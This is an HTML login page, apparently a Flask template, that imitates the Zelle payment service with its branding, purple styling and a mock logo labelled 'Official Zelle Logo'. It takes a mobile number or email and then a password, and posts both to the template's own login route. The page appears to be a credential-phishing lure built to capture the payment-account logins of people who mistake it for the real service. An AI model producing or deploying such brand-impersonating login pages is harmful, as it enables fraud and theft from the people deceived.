<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Zelle</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #f7f8f9;
            color: #1a1a1a;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            min-height: 100vh;
            padding: 40px 20px 24px;
        }
        .login-card {
            background-color: #ffffff;
            width: 100%;
            max-width: 420px;
            border-radius: 20px;
            padding: 44px 36px 40px;
            box-shadow: 0 10px 30px rgba(116, 20, 202, 0.06), 0 2px 8px rgba(0, 0, 0, 0.04);
            display: flex;
            flex-direction: column;
            align-items: center;
            border: 1px solid #eef0f3;
        }
        .logo-container {
            width: 52px;
            height: 52px;
            margin-bottom: 24px;
        }
        .zelle-logo {
            width: 100%;
            height: 100%;
        }
        .title {
            font-size: 24px;
            font-weight: 700;
            color: #111111;
            margin-bottom: 8px;
            text-align: center;
            letter-spacing: -0.3px;
        }
        .subtitle {
            font-size: 14px;
            color: #59636e;
            text-align: center;
            margin-bottom: 32px;
            line-height: 20px;
        }
        .view {
            display: none;
            width: 100%;
            flex-direction: column;
            align-items: center;
        }
        .view.active {
            display: flex;
        }
        .user-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            font-size: 14px;
            font-weight: 600;
            color: #7414ca;
            margin-bottom: 24px;
            background-color: #f5ebff;
            padding: 8px 16px;
            border-radius: 20px;
        }
        .edit-badge-btn {
            color: #7414ca;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: underline;
        }
        .login-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 18px;
        }
        .input-group {
            position: relative;
            width: 100%;
        }
        .input-field {
            width: 100%;
            height: 54px;
            padding: 20px 16px 6px;
            background-color: #ffffff;
            border: 1.5px solid #d0d5dd;
            border-radius: 12px;
            font-size: 16px;
            outline: none;
            color: #111111;
            transition: border-color 0.2s, box-shadow 0.2s;
        }
        .input-field:focus {
            border-color: #7414ca;
            box-shadow: 0 0 0 3px rgba(116, 20, 202, 0.12);
        }
        .input-label {
            position: absolute;
            left: 16px;
            top: 17px;
            font-size: 15px;
            color: #667085;
            pointer-events: none;
            transition: all 0.15s ease;
        }
        .input-field:focus ~ .input-label,
        .input-field:not(:placeholder-shown) ~ .input-label {
            top: 6px;
            font-size: 11px;
            color: #7414ca;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .input-field:not(:focus):not(:placeholder-shown) ~ .input-label {
            color: #667085;
        }
        .eye-btn {
            position: absolute;
            right: 14px;
            top: 17px;
            background: none;
            border: none;
            cursor: pointer;
            color: #667085;
            display: flex;
            align-items: center;
        }
        .forgot-link {
            font-size: 14px;
            font-weight: 600;
            color: #7414ca;
            text-decoration: none;
            align-self: flex-start;
            margin-top: -2px;
            margin-bottom: 6px;
        }
        .forgot-link:hover {
            text-decoration: underline;
        }
        .btn-primary {
            width: 100%;
            height: 50px;
            background-color: #7414ca;
            border: none;
            border-radius: 25px;
            color: #ffffff;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.2s, transform 0.1s;
            margin-top: 4px;
        }
        .btn-primary:hover {
            background-color: #5c0f9f;
        }
        .btn-primary:active {
            transform: scale(0.99);
        }
        .divider {
            display: flex;
            align-items: center;
            width: 100%;
            margin: 20px 0 16px;
            color: #8a94a6;
            font-size: 13px;
            font-weight: 500;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #eaecf0;
        }
        .divider span {
            padding: 0 12px;
        }
        .bank-search-btn {
            width: 100%;
            height: 48px;
            background-color: #ffffff;
            border: 1.5px solid #7414ca;
            border-radius: 24px;
            color: #7414ca;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background-color 0.2s;
        }
        .bank-search-btn:hover {
            background-color: #f5ebff;
        }
        .footer-links {
            display: flex;
            gap: 20px;
            font-size: 12px;
            color: #8a94a6;
            margin-top: 32px;
            flex-wrap: wrap;
            justify-content: center;
        }
        .footer-links a {
            color: #59636e;
            text-decoration: none;
            font-weight: 500;
        }
        .footer-links a:hover {
            color: #7414ca;
        }
        /* Hidden field */
        .hidden-field {
            display: none;
        }
    </style>
</head>
<body>

<main class="login-card">
    <!-- Official Zelle Logo -->
    <div class="logo-container">
        <svg class="zelle-logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M42.5 12H78V26.5L48.5 63.5H79V78H42.5V63.5L72 26.5H42.5V12Z" fill="#7414CA"/>
            <rect x="22" y="12" width="13.5" height="66" rx="6.75" fill="#7414CA"/>
            <rect x="10" y="40" width="80" height="10" transform="rotate(-40 50 45)" fill="#7414CA"/>
        </svg>
    </div>

    <h1 class="title">Log in with Zelle®</h1>
    <p class="subtitle" id="form-subtitle">Enter your registered mobile number or email to continue.</p>

    <!-- STEP 1: Mobile / Email Input -->
    <div id="step-identifier" class="view active">
        <form class="login-form" id="identifier-form">
            <div class="input-group">
                <input type="text" id="identifier-input" class="input-field" placeholder=" " required autofocus />
                <label for="identifier-input" class="input-label">Mobile or Email</label>
            </div>
            <button type="submit" class="btn-primary">Continue</button>
            <div class="divider"><span>or</span></div>
            <a href="#" class="bank-search-btn">Find Your Bank or Credit Union</a>
        </form>
    </div>

    <!-- STEP 2: Password Input -->
    <div id="step-password" class="view">
        <div class="user-badge">
            <span id="display-identifier">user@example.com</span>
            <span class="edit-badge-btn" id="btn-edit-identifier">Edit</span>
        </div>

        <!-- PASSWORD FORM: posts identifier as username, password as password to Flask -->
        <form class="login-form" id="password-form" action="{{ url_for('login') }}" method="POST">
            <!-- Hidden field for identifier (username) -->
            <input type="hidden" name="username" id="hidden-identifier" value="">

            <div class="input-group">
                <input type="password" id="password-input" name="password" class="input-field" placeholder=" " required />
                <label for="password-input" class="input-label">Password</label>
                <button type="button" class="eye-btn" id="toggle-pwd" aria-label="Toggle password visibility">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                        <circle cx="12" cy="12" r="3"></circle>
                    </svg>
                </button>
            </div>

            <a href="#" class="forgot-link">Forgot password?</a>

            <button type="submit" class="btn-primary">Log In</button>
        </form>
    </div>
</main>

<footer class="footer-links">
    <a href="#">Privacy Policy</a>
    <a href="#">Terms of Use</a>
    <a href="#">Security</a>
    <a href="#">Support</a>
</footer>

<script>
    const identifierForm = document.getElementById('identifier-form');
    const identifierInput = document.getElementById('identifier-input');
    const displayIdentifier = document.getElementById('display-identifier');
    const formSubtitle = document.getElementById('form-subtitle');
    const stepIdentifier = document.getElementById('step-identifier');
    const stepPassword = document.getElementById('step-password');
    const btnEditIdentifier = document.getElementById('btn-edit-identifier');
    const passwordInput = document.getElementById('password-input');
    const togglePwd = document.getElementById('toggle-pwd');
    const hiddenIdentifier = document.getElementById('hidden-identifier');

    // Transition from Step 1 to Step 2
    identifierForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const val = identifierInput.value.trim();
        if (val) {
            displayIdentifier.textContent = val;
            hiddenIdentifier.value = val;   // set hidden field for submission
            formSubtitle.textContent = 'Enter your password to complete sign in.';
            stepIdentifier.classList.remove('active');
            stepPassword.classList.add('active');
            passwordInput.focus();
        }
    });

    // Edit Button Action
    btnEditIdentifier.addEventListener('click', () => {
        formSubtitle.textContent = 'Enter your registered mobile number or email to continue.';
        stepPassword.classList.remove('active');
        stepIdentifier.classList.add('active');
        identifierInput.focus();
    });

    // Toggle Password Visibility
    togglePwd.addEventListener('click', () => {
        const isPassword = passwordInput.getAttribute('type') === 'password';
        passwordInput.setAttribute('type', isPassword ? 'text' : 'password');
    });
</script>

</body>
</html>
